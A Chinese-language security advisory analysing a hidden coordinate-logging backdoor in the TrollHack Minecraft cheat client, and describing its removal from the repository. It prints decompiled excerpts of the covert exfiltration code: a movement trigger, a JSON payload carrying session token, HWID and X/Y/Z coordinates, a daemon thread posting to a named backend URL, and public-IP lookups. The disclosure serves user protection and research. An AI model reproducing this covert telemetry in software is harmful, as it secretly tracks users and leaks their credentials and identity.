# 安全公告:TrollHack 内置坐标记录器(后门)

**严重程度:高(隐私 / 数据外泄)**
**状态:本仓库已移除**
**类型:未声明的遥测 / 坐标记录器(coord logger)**

原版 TrollHack("Oa7h EXTREME" / ZKM 混淆)客户端在用户不知情的情况下,**持续把玩家的实时坐标、所在服务器、维度、硬件指纹(HWID)和会话 token 上报到作者控制的后端**。本文给出完整静态分析证据,所有结论均可在 `obf-test-NAMED.jar` 字节码中复核。**本仓库已将其移除**(发送逻辑与触发器打桩、联网授权中和),编译产物不发任何网络请求。

> 说明:原版还带一枚 JNIC(Java→原生)编译的 native DLL(`neko/lib/*.dat`)。那是**代码保护混淆,不是后门**;本仓库把它连同无人引用的 `shit.Loader` 死代码一并删掉了(源码重建后用不上),特此更正之前把它当"后门"的错误描述。

---

## 坐标记录器(coord logger)

| 项目 | 内容 |
|---|---|
| 收集的数据 | 会话 token、HWID、服务器 IP、维度、**X/Y/Z 坐标**、公网 IP、时间戳 |
| 上报端点 | `POST http://neko.antichest.pw/api/index.php`(路由 `/coordinate-log`) |
| 触发条件 | 玩家每移动 ≥ 8 格,或切换服务器 / 维度 |
| 承载方式 | 后台守护线程,名为 `TrollHack-CoordinateTelemetry` |
| 用户可见 | 无。无提示、无开关、无设置项 |
| 本仓库处置 | 发送逻辑与其触发器已打桩;整套联网授权已中和。**编译产物不发出任何请求** |

---

## 证据链

### 1. 触发器:每次移动都检查是否该上报

`shit.manager.SessionManager` 订阅了 tick 事件。`m490` 决定是否上报:

```java
double d  = player.getX() - this.value140;
double d2 = player.getY() - this.value173;
double d3 = player.getZ() - this.value132;
return d*d + d2*d2 + d3*d3 >= 64.0;   // 移动超过 8 格(8² = 64)即上报
```

同时,只要**服务器地址**(`m245`,返回当前服 IP)或**维度**(`m1024`)变化,也会触发。也就是说:你换服、进地狱、或者只是走了几步,它就记一次。

### 2. 载荷:打包你的坐标和身份

`SessionManager.lambda$send$0` 构造如下 JSON(字段名摘自 `makeConcatWithConstants` 常量,原样):

```json
{
  "token": "…", "hwid": "…",
  "server": "<服务器IP>", "dimension": "minecraft:overworld",
  "dimensionLabel": "主世界/地狱/末地",
  "x": <X>, "y": <Y>, "z": <Z>,
  "client": "trollhack-recode", "version": "1.0.0",
  "time": "…", "timestamp": <epoch>
}
```

其中维度还被 `m620` 翻译成中文标签(`地狱` / `末地` / `主世界`)—— 说明这份数据是给**人看的报表 / 面板**准备的,不是什么匿名统计。

### 3. 传输:后台线程 POST 到 antichest.pw

```java
// SessionManager.send(...) 反编译(变量名保留原始 ZKM 命名)
Thread thread = new Thread(
    () -> lambda$send$0(server, token, hwid, dim, x, y, z),
    "TrollHack-CoordinateTelemetry"      // ← 线程名由作者亲自命名
);
thread.setDaemon(true);
thread.start();
```

`lambda$send$0` 末尾:

```java
ApiEndpoints2.m651("/coordinate-log", jsonBody);   // POST
```

端点主机在 `shit.util.ApiEndpoints2` 第 33 行**明文**写着:

```
http://neko.antichest.pw/api/index.php
```

此外 `ApiEndpoints3`(第 558 行)会先通过 `api.ipify.org` / `ifconfig.me` / `icanhazip.com` 获取用户**公网 IP**。

### 4. 归属

模块 `IRC` 的描述是 `"Connects to the NekoTeam IRC relay chat."` —— `NekoTeam` 对应 `neko.antichest.pw`,即上报后端所属组织。域名 `antichest.pw`(反-藏宝箱)本身就点明了用途。

---

## 影响

拥有该后端的人可以:

- **实时定位每一个用户**在每一个服务器上的坐标 → 挖矿、建家、藏基地全部暴露(经典的"用作弊端反被作者猎杀 / 卖坐标")
- 用 **HWID + token + 公网 IP** 对用户跨服打指纹、关联身份、封禁或勒索
- 在用户完全不知情的情况下长期收集上述数据

对一个作弊客户端而言,这是**最典型的恶意行为之一**:它把使用者本身变成了被监控的对象。

---

## 本仓库的处置

- `SessionManager.send(...)` 及其 tick 触发器 `setEvent2Inner23(...)` → 打桩(抛异常),**遥测永不触发**
- 联网授权总开关 `ApiEndpoints3.isSet46()` / `isSet68()` → `return true`,使 `ApiEndpoints2/3`、`HttpUtil`、web-login 全部成为够不着的死代码
- 结果:客户端启动到主菜单**零联网、零上报**,不会向 `neko.antichest.pw` 发送任何数据

## 如何自行复核

```bash
# 反编译看源码
javap -p -c obf-test-NAMED.jar   # 或用 Recaf 打开

# 关键位置:
#   shit/manager/SessionManager   -> m490(触发) / send(线程) / lambda$send$0(载荷)
#   shit/util/ApiEndpoints2:33     -> http://neko.antichest.pw/api/index.php
#   shit/util/ApiEndpoints3:558    -> 公网 IP 抓取
```

---

## 免责声明

本公告基于对一份**公开分发的二进制产物**的静态逆向分析,用于安全研究与用户知情。所有技术论断均附源码 / 字节码位置,可独立验证。若原作者认为分析有误,欢迎提 issue 附字节码反驳。
